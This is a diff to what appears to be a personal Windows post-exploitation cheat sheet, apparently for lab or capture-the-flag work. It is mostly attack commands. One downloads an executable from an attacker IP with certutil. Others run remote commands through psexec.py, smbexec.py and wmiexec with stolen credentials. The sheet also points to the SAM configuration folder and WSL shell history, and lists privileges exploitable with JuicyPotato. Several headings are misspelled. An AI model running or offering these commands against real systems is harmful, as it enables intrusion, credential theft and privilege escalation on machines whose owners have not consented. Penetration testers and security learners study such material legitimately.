@@ -85,9 +85,20 @@ first go to c:/temp folder
 certutil -urlcache -f http://10.10.14.32/temp.exe temp.exe
 ```
 
+## Windows subsystem for linux
+
+### Search for bash or wsl
+```
+where /R C:\windows bash.exe
+where /R C:\windows wsl.exe
+```
+If you found connect to linux sub folder and search for history.
+
 ## Use credentials to login using psexec.py
 ```
-python psexec.py USER:PASSWORD@DOMAIN
+psexec.py USER:PASSWORD@DOMAIN
+smbexec.py USER:PASS@DOMAIN
+wmiexec USER:PASS@DOAMIN
 ```
 
 ## connect to SMB using credentials
@@ -100,3 +111,22 @@ smbclient \\\\IP\\FOLDER -U USER
 ```
 C:\Windows\System32\Config
 ```
+
+## Imporsanate privilage escalate
+
+### Search for privilages
+```
+whoami /priv
+```
+
+### Use this command to search meterpreter session
+```
+getprivs
+```
+
+## These privilages are vulnerable to juicypotato attacks
+```
+SeImporsanatePrivilage Enable
+SeAssignPrimaryToken Enable 
+```
+
